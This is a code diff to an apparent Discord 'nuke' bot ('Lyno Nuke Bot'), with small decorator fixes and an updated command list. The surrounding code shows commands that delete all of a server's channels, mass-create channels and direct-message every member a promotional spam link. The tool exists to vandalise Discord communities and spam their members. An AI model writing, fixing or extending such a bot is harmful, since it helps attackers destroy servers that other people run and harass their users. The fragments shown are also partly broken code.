@@ -42,10 +42,10 @@ lynodestroyer = commands.Bot(command_prefix=prefix, intents=intents)
 async def on_ready():
     await lynodestroyer.change_presence(activity=discord.Streaming(name="✅Lyno Nuke Bot | dsc.gg/lyno", url=twitch))
     print(f"Bot Is Online , Loggined As {lynodestroyer.user.name} , Lyno Is Active !")
-    print(f"Commands : {prefix}nuke")
+    print(f"Commands : {prefix}nuke {prefix}delchan {prefix}createchan {prefix}ping")
     # it can be discord.Status.online , idle dnd streaming etc...
 
-@lynodestroyer.command
+@lynodestroyer.command()
 async def nuke(ctx):
     guild = ctx.guild
     channels = guild.channels
@@ -64,7 +64,7 @@ async def nuke(ctx):
         await member.send(f"{member.mention} https://dsc.gg/lyno = free bot")
 
 
-@lynodestroyer.command
+@lynodestroyer.command()
 async def delchan(ctx):
     guild = ctx.guild
     channels = guild.channels
@@ -73,7 +73,7 @@ async def delchan(ctx):
         await channels.delete()
     await user.send(f"{user.mention} Successfully Deleted All Channels !")
 
-@lynodestroyer.command
+@lynodestroyer.command()
 async def createchan(ctx):
     guild = ctx.guild
     channels = guild.channels
@@ -82,7 +82,7 @@ async def createchan(ctx):
         await guild.create_text_channel(name=channelname)
     await user.send(f"{user.mention} Successfully Created All Channels !")
 
-@lynodestroyer.command
+@lynodestroyer.command()
 async def ping(ctx):
     guild = ctx.guild
     channels = guild.channels
